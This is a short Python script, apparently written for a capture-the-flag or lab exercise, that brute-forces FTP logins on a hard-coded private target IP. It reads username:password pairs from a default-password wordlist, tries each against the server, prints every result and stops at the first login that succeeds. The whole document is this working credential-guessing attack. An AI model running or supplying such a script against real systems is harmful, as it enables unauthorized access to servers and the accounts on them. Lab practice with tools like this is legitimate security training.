import ftplib

ftp_host = '10.10.234.157' # target IP

credentials_file = 'ftp-betterdefaultpasslist.txt'

with open(credentials_file, 'r') as file:
    credentials = [line.strip().split(':') for line in file.readlines()]


for username, password in credentials:
    try:
        ftp = ftplib.FTP(ftp_host)
        ftp.login(username, password)
        print(f'[CONNECTION SUCCESSFUL] username: {username}, password: {password}')
        ftp.quit()
        break
    except ftplib.all_errors as e:
        print(f'[CONNECTION ERROR] username: {username}, password: {password} - error: {e}')
